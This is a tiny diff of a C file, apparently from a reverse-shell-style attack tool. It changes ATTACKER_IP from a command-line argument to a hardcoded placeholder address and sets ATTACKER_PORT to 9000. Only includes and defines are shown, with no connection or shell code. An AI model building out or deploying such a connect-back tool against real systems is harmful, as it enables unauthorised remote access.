@@ -1,7 +1,7 @@
 #include <arpa/inet.h>
 #include <stdio.h>
 #include <unistd.h>
-#define ATTACKER_IP argv[1]
+#define ATTACKER_IP "0.0.0.0" //insert attacker ip
 
 #define ATTACKER_PORT 9000
 
